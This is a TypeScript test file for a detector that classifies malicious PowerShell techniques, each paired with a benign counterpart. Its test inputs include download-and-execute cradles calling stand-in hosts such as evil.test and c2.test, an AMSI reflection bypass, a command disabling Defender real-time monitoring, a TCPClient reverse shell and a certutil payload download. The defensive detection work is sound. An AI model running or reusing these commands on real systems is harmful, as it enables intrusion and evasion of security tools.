import { describe, expect, it } from 'vitest'
import { buildContext, classify } from '../techniques'
import { preprocess } from '../preprocess'

function analyze(text: string, raw = text) {
  return classify(buildContext(text, preprocess(raw).flags))
}
const ids = (text: string, raw = text) => analyze(text, raw).map((s) => s.id)
const specOf = (text: string, id: string, raw = text) =>
  analyze(text, raw).find((s) => s.id === id)?.specificity

describe('download cradle', () => {
  it('fires when fetched content flows into an interpreter', () => {
    const sigs = analyze("IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
    const c = sigs.find((s) => s.id === 'download-cradle')
    expect(c).toBeTruthy()
    expect(c!.techniqueIds).toContain('T1105')
    expect(c!.trigger).toBeTruthy()
  })

  it('benign twin: download to a FILE (no IEX sink) does NOT fire', () => {
    expect(ids("Invoke-WebRequest https://example.com/data.json -OutFile data.json"))
      .not.toContain('download-cradle')
  })
})

describe('evasion-flag clustering', () => {
  it('fires on a 3+ evasion-flag cluster carrying an -enc payload', () => {
    const raw = "powershell -nop -w hidden -ep bypass -enc SQBFAFgA"
    expect(ids('IEX $x', raw)).toContain('evasion-cluster')
  })

  it('benign twin: evasion cluster running a LOCAL -File script does NOT fire', () => {
    const raw = "powershell -nop -w hidden -ExecutionPolicy Bypass -File C:\\ops\\backup.ps1"
    expect(ids('Get-ChildItem', raw)).not.toContain('evasion-cluster')
  })

  it('the -File discriminator is load-bearing: the same cluster+payload fires, and a -File in the corpus suppresses it', () => {
    const raw = 'powershell -nop -w hidden -ep bypass' // 3-flag cluster, no -File
    const payload = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
    // cluster>=3 AND payload (fetch+IEX sink) AND no -File -> fires
    expect(ids(payload, raw)).toContain('evasion-cluster')
    // same cluster+payload, but a -File mention in the corpus -> localFile suppresses it
    expect(ids('-File C:\\ops\\job.ps1 ; ' + payload, raw)).not.toContain('evasion-cluster')
  })
})

describe('co-occurrence upgrade', () => {
  it('bumps evasion-cluster weak -> strong when a download cradle co-fires', () => {
    const raw = "powershell -nop -w hidden -ep bypass -enc AAAA"
    const script = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
    expect(specOf(script, 'evasion-cluster', raw)).toBe('strong')
  })
})

describe('determinism / ordering', () => {
  it('returns signals in a stable rule order', () => {
    const a = ids("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    const b = ids("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    expect(a).toEqual(b)
  })
})

describe('AMSI / ETW / Defender tampering', () => {
  it('AMSI reflection patch is near-dispositive on its own', () => {
    const s = analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")
    const a = s.find((x) => x.id === 'amsi-reflection')
    expect(a).toBeTruthy()
    expect(a!.specificity).toBe('near-dispositive')
  })

  it('AMSI memory patch (AmsiScanBuffer + VirtualProtect) is near-dispositive', () => {
    const s = analyze("$p = VirtualProtect $addr 0x1000 0x40 ([ref]$old); ... AmsiScanBuffer patch")
    expect(s.find((x) => x.id === 'amsi-memory-patch')?.specificity).toBe('near-dispositive')
  })

  it('Defender cmdlet tampering stays STRONG (installer/GPO benign twin exists)', () => {
    const s = analyze("Set-MpPreference -DisableRealtimeMonitoring $true")
    const d = s.find((x) => x.id === 'defender-tamper')
    expect(d).toBeTruthy()
    expect(d!.specificity).toBe('strong')
  })

  it('benign twin: a legitimate Add-MpPreference exclusion by itself is only STRONG, never near-dispositive', () => {
    const s = analyze("Add-MpPreference -ExclusionPath 'C:\\Program Files\\VendorApp'")
    const nd = s.filter((x) => x.specificity === 'near-dispositive')
    expect(nd).toHaveLength(0)
  })

  it('ETW tampering fires (strong)', () => {
    const s = analyze("[Reflection.Assembly]::Load(...); EtwEventWrite patched via reflection")
    expect(s.find((x) => x.id === 'etw-tamper')?.specificity).toBe('strong')
  })
})

describe('ClickFix / paste-and-run', () => {
  it('fires on a hidden-window one-liner that fetches and IEXes', () => {
    const raw = "powershell -nop -w hidden -c IEX (iwr http://evil.test/x).Content"
    expect(ids('IEX (iwr http://evil.test/x).Content', raw)).toContain('clickfix')
  })
  it('fires on conhost --headless powershell', () => {
    expect(ids("conhost --headless powershell -nop -c iex(irm http://x.test/a)"))
      .toContain('clickfix')
  })
  it('benign twin: a plain hidden -File task does NOT fire', () => {
    const raw = "powershell -w hidden -nop -File C:\\ops\\job.ps1"
    expect(ids('Get-Date', raw)).not.toContain('clickfix')
  })
})

describe('beaconing + reverse shell + loaders + persistence', () => {
  it('beaconing: jittered sleep loop + same-host fetch', () => {
    expect(ids("while($true){ Start-Sleep (Get-Random -Min 30 -Max 90); IEX (New-Object Net.WebClient).DownloadString('http://c2.test/t') }"))
      .toContain('beaconing')
  })
  it('reverse-shell: TCPClient stream feeding IEX is near-dispositive', () => {
    const s = analyze("$c=New-Object Net.Sockets.TCPClient('10.0.0.5',4444);$s=$c.GetStream();IEX $data")
    expect(s.find((x) => x.id === 'reverse-shell')?.specificity).toBe('near-dispositive')
  })
  it('fileless-loader: VirtualAlloc + CreateThread on a byte array', () => {
    expect(ids("$b=[byte[]](0x90,0x90); $a=VirtualAlloc 0 $b.Length 0x3000 0x40; CreateThread 0 0 $a 0 0 0"))
      .toContain('fileless-loader')
  })
  it('persistence: Register-ScheduledTask fires (strong)', () => {
    const s = analyze("Register-ScheduledTask -TaskName Updater -Action $a -Trigger $t")
    expect(s.find((x) => x.id === 'persistence')?.specificity).toBe('strong')
  })
  it('benign twin: a bare Start-Sleep with no loop/fetch is not beaconing', () => {
    expect(ids("Start-Sleep -Seconds 5")).not.toContain('beaconing')
  })
})

describe('LOLBin surfaces through classify', () => {
  it('emits a lolbin signal naming the binary', () => {
    const s = analyze("certutil.exe -urlcache -split -f http://45.9.148.20/a.exe a.exe")
    const l = s.find((x) => x.id === 'lolbin')
    expect(l).toBeTruthy()
    expect(l!.label.toLowerCase()).toContain('certutil')
  })
})
